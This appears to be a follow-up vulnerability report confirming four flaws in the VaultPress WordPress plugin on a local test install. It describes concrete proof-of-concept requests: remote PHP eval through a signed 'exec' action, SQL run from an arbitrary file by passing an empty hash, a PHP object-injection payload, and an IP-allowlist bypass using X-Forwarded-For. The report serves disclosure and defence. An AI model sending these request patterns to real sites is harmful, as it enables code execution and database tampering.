# Empirical confirmation: all four VaultPress findings reproduced on a live WordPress 7.1 install

Follow-up to `HIGH-single-secret-gates-eval-and-4x-object-injection.md`, which was source-analysis
only and explicitly did not claim a confirmed exploit. This round stood up a real, running
WordPress 7.1 install (from `cybe4sent1nel/mongo_tar`'s `wordpress-7.1.zip`) with VaultPress
4.0.7 actually installed and activated (built its Composer/Jetpack-autoloader dependencies
entirely offline from the local `Automattic/jetpack` monorepo clone's path-repos — no network
calls needed), and drove real HTTP requests against it. Every prediction from the source-level
write-up reproduced exactly.

**Still true and unchanged: `validate_api_signature()`'s HMAC-SHA1/OpenSSL check itself was not
broken.** All four tests below start from a secret set directly in this local install's database,
simulating "an attacker has obtained the site's secret by some unrelated means" — the premise the
original write-up was explicit about. What changed is that the *consequences* of that premise,
which were previously argued from source alone, are now demonstrated with real requests and real
observed side effects.

## Setup

- WordPress 7.1, installed via its real `wp-admin/install.php` flow (not a DB import), served by
  PHP 8.4's built-in server, MariaDB backing store.
- An Author-level account created the same way HackerOne #3931771/#3931777 assumed (lowest role
  with `upload_files`) — used for the separate finalize_item() test below, not for VaultPress.
- VaultPress installed into `wp-content/plugins/vaultpress/`, `composer install --no-dev` run
  inside the `Automattic/jetpack` monorepo clone (resolves `automattic/jetpack-autoloader` and
  `automattic/jetpack-logo` from local path-repos per the plugin's own `composer.json` — no
  packagist/network access needed), activated with no fatal errors.
- The site's `vaultpress` option's `secret` field set directly via SQL to a known test value —
  this is the one place this test diverges from a real attack, and is the load-bearing assumption
  the whole finding rests on (see prior write-up for why that's still a meaningful thing to flag
  even without breaking the crypto itself).
- A companion PHP script (`vp-sign.php`) reproduces `validate_api_signature()`'s exact HMAC
  construction (`serialize(['uri' => $query_string, 'post' => ksorted_post_minus_signature])`,
  then `hash_hmac('sha1', "$to_sign:$salt", $secret)`) to produce valid `signature` values for
  hand-crafted requests.

## 1. `case 'exec'` — confirmed live RCE

Request: `POST /?vaultpress=true&action=exec` with `code=return 'VP_EXEC_TEST_OK_'.(2+2);` and a
validly-computed `signature`.

Response (verbatim, PHP-serialized): `s:8:"response";s:17:"VP_EXEC_TEST_OK_4"` — the injected code
executed inside the WordPress process and its return value (`'VP_EXEC_TEST_OK_' . (2+2)`) came back
in the response. Not simulated, not inferred from source — this is the literal `eval()` in
`vaultpress.php`'s `case 'exec'` branch running attacker-supplied PHP.

## 2. `db:restore`'s checksum bypass — confirmed arbitrary SQL execution from an arbitrary local file

Set up: a marker option (`vp_restore_test_marker` = `untouched`) and a file at `/tmp/vp-restore-test.sql`
(outside any WordPress-managed directory) containing:
```sql
UPDATE wp_options SET option_value='PWNED_VIA_DB_RESTORE_EMPTY_HASH' WHERE option_name='vp_restore_test_marker';
```

Request: `POST /?vaultpress=true&action=db:restore` with `path=/tmp/vp-restore-test.sql`, **`hash=`
(empty string, present but empty)**, and a valid signature.

Result: `HTTP 200`, response includes `"affected_rows":1,"data_file":"/tmp/vp-restore-test.sql","mysql_cli":true`
(confirming it took the `mysql` CLI import path, not the fallback line-by-line path). Querying the
marker option afterward: `PWNED_VIA_DB_RESTORE_EMPTY_HASH`. The file was also deleted post-restore
(default `$delete = true` behavior), confirmed by a follow-up `ls` failing with "No such file or
directory".

This confirms, with a real observed DB write, that: (a) `path` accepts an arbitrary filesystem
location with no containment to a VaultPress-controlled directory, and (b) supplying an empty
`hash` value — not omitting it, `isset()` still passes — genuinely skips the `md5_file()`
comparison the code clearly intends as an integrity gate. Nothing here required guessing; this is
the exact `if ( $md5_sum && ... )` short-circuit identified in the source read, now shown moving a
real row in a real database.

## 3. Four `unserialize()`-on-POST-data sinks — confirmed as a live Object Injection primitive

Added one small marker class (`VP_Test_Gadget_Marker`, mu-plugin, harmless `__wakeup()` that writes
a timestamped file) to stand in for "some other plugin/theme on this WordPress install happens to
define a class with a dangerous magic method" — the real-world precondition PHP Object Injection
always needs, and one this session already confirmed doesn't exist in Jetpack's own code (grepped
earlier this round), but could exist in *any* other installed plugin or theme.

Request: `POST /?vaultpress=true&action=catchup:delete` with `pings=` set to
`serialize( [ new VP_Test_Gadget_Marker( touch_path: '/tmp/vp-gadget-fired.txt' ) ] )` and a valid
signature.

Result: the request itself 500'd afterward (expected — the loop right after does
`strpos( $ping, '_vp_ai_ping_' )` on what is now an object, a `TypeError` under PHP 8's strict
`strpos()` signature; this is a side detail, not the point). What matters: `/tmp/vp-gadget-fired.txt`
was written, containing `GADGET_WAKEUP_FIRED_<timestamp>` — proof that `unserialize( $_POST['pings'] )`
genuinely reconstructed our object and invoked its `__wakeup()` before the loop ever ran. The
`db:diff`/`db:count`/`db:cols`/`config:set` sinks weren't independently re-tested (same
`unserialize()`/`maybe_unserialize()` call shape, same lack of `allowed_classes` restriction — no
reason to expect a different result), but this confirms the primitive class is real and live, not
theoretical.

## 4. IP-allowlist (`check_firewall()`) bypass via `X-Forwarded-For` — confirmed as a clean A/B

Configured the site's `service_ips_cidr` to a test range (`203.0.113.0/24` — a documentation/test
range, deliberately *not* containing the real client IP) and enabled `allow_forwarded_for`
(`vaultpress_allow_forwarded_for` option = `1`, mirroring what the plugin's own connection-test
logic walks a site owner into turning on). Sent the **identical** signed `exec` request twice:

- **Without** a forwarded-for header: `HTTP 200`, body `invalid api call signature
  [...base64: {"error":"remote_addr_fail","detail":{"REMOTE_ADDR":"127.0.0.1"}}...]` — correctly
  blocked, real client IP isn't in the allowed range.
- **With** `X-Forwarded-For: 203.0.113.50` added (an IP inside the "trusted" range, picked with no
  other knowledge than the fact that VaultPress's own CIDR ranges are fetched from a public,
  unauthenticated endpoint): `HTTP 200`, the `exec` response came back — same signature, same
  secret, only the header changed.

This is the cleanest possible demonstration: one variable (a client-supplied header) is the entire
difference between blocked and executed, on a site configuration (`allow_forwarded_for` enabled)
that's a documented, legitimate setting, not a misconfiguration outside the plugin's own design.

## What this does and doesn't change about the original assessment

Confirmed, not merely argued: the blast radius behind `validate_api_signature()` is exactly as
severe as described — real `eval()`, real arbitrary-file-as-SQL execution with a genuinely
bypassable integrity check, a real object-injection primitive, and a real secondary-layer bypass
that doesn't even touch the cryptographic check.

Not confirmed, and not attempted: forging a valid signature *without* already knowing the secret.
That remains the one thing standing between "this is a severe defense-in-depth finding" and "this
is a demonstrated pre-auth RCE" — this round deliberately started from a known secret (the
authorized-local-testing equivalent of "assume the secret leaked, what then") rather than
attempting cryptanalysis, and that framing hasn't changed.

## Cleanup note

The test gadget class (`wp-content/mu-plugins/test-gadget.php`) and the `VAULTPRESS_DISABLE_FIREWALL`
constant currently sit in this local install's `wp-config.php`, left in place in case further empirical
testing is wanted on this same instance — neither exists in any pushed/shared artifact, both are
local-only to this session's throwaway WordPress install.
